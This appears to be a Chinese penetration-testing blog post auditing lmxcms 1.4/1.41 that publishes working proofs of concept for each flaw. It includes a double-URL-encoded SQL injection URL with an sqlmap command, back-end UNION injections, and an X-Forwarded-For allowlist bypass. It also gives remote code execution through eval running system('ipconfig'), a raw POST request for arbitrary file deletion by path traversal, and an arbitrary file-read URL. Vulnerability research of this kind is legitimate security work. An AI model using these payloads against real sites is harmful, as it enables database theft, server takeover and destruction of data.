---
title: lmxcms全漏洞poc
copyright: true
date: 2022-02-10 14:52:26
tags: 渗透测试
---
lmxcms源码审计
<!-- more -->
**1.4前台sql注入漏洞**  
c/index/TagsAction.class.php  
1.构造函数通过_POST方式获取name变量  
2.p函数对数据校验，过滤关键字+addslashes转义  
3.通过delHtml函数（strip_tag函数）去除标签对，进行一次url编码  
4.sql拼接查询   
![1.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png?raw=true)  
![2.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png?raw=true)  
![3.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png?raw=true)  
数据检查后进行了一次urldecode，可以通过两次url编码绕过addslashes函数的转义  
```
poc: 'and (updatexml(1,concat(0x7e,(database()),0x7e),1)) and '1'='1  

两次Urldecode：http://127.0.0.1:8081/lmxcms1.4/index.php?m=tags&a=index&name=%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%39%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%37%25%33%31%25%32%37%25%33%64%25%32%37%25%33%31
```
![4.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png?raw=true)  
lmx1.txt  
```
GET /lmxcms1.4/index.php?m=tags&a=index&name=1 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=jiit711t06f5plsu8fo7bbqla2; XDEBUG_SESSION=XDEBUG_ECLIPSE
Upgrade-Insecure-Requests: 1
```
sqlmap：  
```
python2 sqlmap.py -r lmx1.txt --technique=E -v3 --tamper=chardoubleencode -p name --dbs
```

**1.4/1.41后台sql注入漏洞**  
c/index/AcquisiAction.class.class.php  
POST的参数未过滤，但后台本身可以执行sql语句（无回显），此漏洞危害较低  
![5.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png?raw=true)  
```
poc：1' and updatexml(0,concat(0x7e,database()),1) and '1
```
![6.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png?raw=true)  
c/admin/AcquisAction.class.php 中 311行查询时对获取的lid参数未检验，且sql语句直接拼接，导致sql注入  
![7.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png?raw=true)  
![8.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png?raw=true)  
```
Poc: http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Acquisi&a=showCjData&lid=-1+union+select+1,1,1,(select+1+and+(updatexml(1,concat(0x7e,(select+database()),0x7e),1))),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
```
![9.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png?raw=true)  
**1.4/1.41绕过ip白名单**  

后台ip白名单可通过X-Forwarded-For 绕过  
![10.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png?raw=true)  

**1.4/1.41后台任意代码执行**
c/admin/AcquisAction.class.php 中 318行eval执行了$temdata['data']参数，该参数的值是从lmx_cj_list数据表中查询出的array字段的值，而查询时存在sql注入导致该字段可控，从而导致任意代码执行。  
![11.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png?raw=true)  
```
Poc: admin.php?m=Acquisi&a=showCjData&lid=-1+union+select+1,1,1,'1;system(\'ipconfig\');',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
```
![12.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png?raw=true)  
**1.4/1.41 后台任意文件删除**  
c/admin/FileAction.class.php 中使用unlink方法删除文件，unlink方法调用php unlink方法，此处未对传入的路径做检查，存在任意文件删除。  
![13.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png?raw=true)  

poc:  
```
POST /lmxcms1.4/admin.php?m=File&a=delete HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/lmxcms1.4/admin.php?m=File&a=index&type=0
Upgrade-Insecure-Requests: 1

type=0&delImages=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87&fid%5B%5D=7#####/test.txt
```
其中test.txt在index.php 同级目录下，且可使用..进行目录穿越。  
**1.4/1.41 后台任意文件读取**  
c/admin/TemplateAction.class.php  
![14.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png?raw=true)  
![15.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png?raw=true)  
![16.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/16.png?raw=true)  
poc:
```
http://localhost:8081/lmxcms1.4/admin.php?m=Template&a=editfile&dir=../flag.txt
```
